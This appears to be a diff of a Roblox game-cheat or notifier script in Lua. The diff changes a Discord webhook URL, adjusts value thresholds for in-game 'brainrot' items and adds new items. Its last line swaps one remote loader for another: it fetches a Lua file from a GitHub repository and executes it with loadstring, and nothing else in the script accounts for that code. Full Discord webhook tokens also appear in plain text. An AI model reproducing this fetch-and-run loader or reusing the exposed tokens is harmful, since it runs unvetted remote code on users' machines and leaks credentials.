@@ -57,7 +57,7 @@ local WEBHOOKS = {
         sendTeleport = true
     },
     { -- Special brainrots + overpay
-        url = 'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo',
+        url = 'https://discord.com/api/webhooks/1449111713428275282/1CByDVDPiQUqD0r59w9DxtJ1F9CUpjbXzPrnA_kvtRvz2KIKpXMMBdTM2kYkYswTP45I',
         title = '⭐️ SPECIAL BRAINROTS',
         color = 0xff00ff,
         special = true,
@@ -88,7 +88,7 @@ local SPECIAL_BRAINROTS = {
     ['Fragrama and Chocrama'] = 0,
     ['Guest 666'] = 0,
     ['Fishino Clownino'] = 0,
-    ['Tacorita Bicicleta'] = 170_000_000,
+    ['Tacorita Bicicleta'] = 100_000_000,
     ['La Jolly Grande'] = 200_000_000,
     ['W or L'] = 200_000_000,
     ['Los Puggies'] = 400_000_000,
@@ -99,7 +99,7 @@ local SPECIAL_BRAINROTS = {
     ['La Spooky Grande'] = 245_000_000,
     ['Eviledon'] = 400_000_000,
     ['Chillin Chili'] = 25_000_000,
-    ['Money Money Puggy'] = 170_000_000,
+    ['Money Money Puggy'] = 178_000_000,
     ['Tang Tang Keletang'] = 100_000_000,
     ['Los Primos'] = 300_000_000,
     ['Orcaledon'] = 320_000_000,
@@ -113,6 +113,9 @@ local SPECIAL_BRAINROTS = {
     ['La Ginger Sekolah'] = 0,
     ['Gingerat Gerat'] = 0,
     ['Reinito Sleighito'] = 0,
+    ['Swaggy Bros'] = 0,
+    ['Gingerbread Dragon'] = 0,
+    ['Los Spaghettis'] = 500_000_000,
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -674,4 +677,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hpwerdsf/steal/refs/heads/main/nenado"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CapibaroLimonchel/FFISH/refs/heads/main/BotRuner2.lua"))()
